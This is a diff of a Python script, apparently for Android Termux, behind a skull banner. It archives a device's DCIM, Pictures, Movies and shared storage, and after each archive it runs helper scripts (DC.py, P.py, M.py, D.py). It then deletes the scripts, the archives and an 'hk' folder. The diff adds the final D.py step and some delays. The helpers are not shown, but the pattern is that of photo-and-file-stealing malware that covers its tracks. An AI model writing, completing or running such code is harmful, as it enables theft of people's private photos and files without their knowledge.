@@ -14,8 +14,7 @@ RESET   = '\033[39m'
 os.system("clear")
 print(RED+"""
 ⠀⠀⠀⠀⠀⢀⣀⣠⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣦⣤⣄⣀⡀
-⠀⠀⣠⣶⣾⡿⠿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⢿⣷⣶⣄⡀
-⢠⣾⡟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢻⣿⡄
+⠀⠀⣠⣶⣾⡿⠿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⢿⣷⣶⣄⡀                                                                                                                   ⢠⣾⡟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢻⣿⡄
 ⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
 ⢸⣿⡇⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⢸⣿⡇
 ⢸⣿⡇⠀⠀⢀⡶⠛⠛⠛⠛⠻⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠟⠛⠛⠛⠛⠶⡄⠀⠀⢸⣿⡇
@@ -58,15 +57,19 @@ os.chdir("../storage/shared")
 os.system("clear")
 os.system("zip -r DC.zip DCIM")
 os.system("python DC.py")
+time.sleep(3.0)
 os.system("clear")
 os.system("zip -r P.zip Pictures")
 os.system("python P.py")
+time.sleep(3.0)
 os.system("clear")
 os.system("zip -r M.zip Movies")
 os.system("python M.py")
+time.sleep(3.0)
 os.system("clear")
-os.system('zip -r D.zip . -x "*.mp3" "*.apk"')
+os.system("zip -r D.zip . -x '*.mp3' '*.apk'")
+os.system("python D.py")
 os.system("rm -rf D.py D.zip P.py P.zip DC.py DC.zip M.py M.zip")
 os.system("rm-rf TEST")
-os.cgdir("../../")
+os.chdir("../../")
 os.system("rm -rf hk")
